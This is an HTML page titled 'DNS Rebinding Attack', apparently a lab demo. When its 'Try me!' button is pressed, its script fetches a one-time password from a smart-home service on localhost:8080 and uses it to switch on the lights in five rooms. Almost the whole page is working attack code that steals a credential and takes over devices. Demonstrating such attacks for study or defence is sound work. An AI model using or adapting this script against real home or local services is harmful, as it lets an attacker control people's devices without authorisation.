<!doctype html>
<html>
    <head>
        <title>DNS Rebinding</title>
        <meta charset="utf-8"/>
        <style>
            body {background-color: darkgrey}
            h1 {font-size:1.5cm; text-align: center; color: black}
            button {padding: 16px 32px; text-align: center;
                font-size: 16px; background-color: #C0C0C0;
                border: 3.5px solid grey; cursor: pointer}
            button:hover {background-color: grey}
        </style>
    </head>
    <body>
        <div class="container" style="text-align: center">
   	        <h1>DNS Rebinding Attack</h1>
            <button type="button" class="btn" onclick="launchAttack()">Try me!</button>
        </div>
        <script>
            function launchAttack() {
                console.log('Launching attack...');
                attackRoom("hallway");
                attackRoom("kitchen");
                attackRoom("bedroom");
                attackRoom("livingroom");
                attackRoom("bathroom");
                console.log('Attack finished!');
            }

            function attackRoom(room) {
                var url = "http://localhost:8080/password";
                var http = new XMLHttpRequest();
                http.open("GET", url, false);
                http.onreadystatechange = function() {
                    if(http.readyState == 4 && http.status == 200) {
                        otp = JSON.parse(this.responseText).otp
                        console.log(otp)
                        turnLightsOn(room, otp); 
                    }
                }
                http.send();
            }

            function turnLightsOn(room, otp) {
                var url = "http://localhost:8080/lights?room="+room+"&value=true&otp="+otp;
                var http = new XMLHttpRequest();
                http.open("POST", url, false);
                http.onreadystatechange = function() {
                    if(http.readyState == 4 && http.status == 200) {
                        console.log(this.responseText)
                    }
                }
                http.send();
            }
        </script>
    </body>
</html>
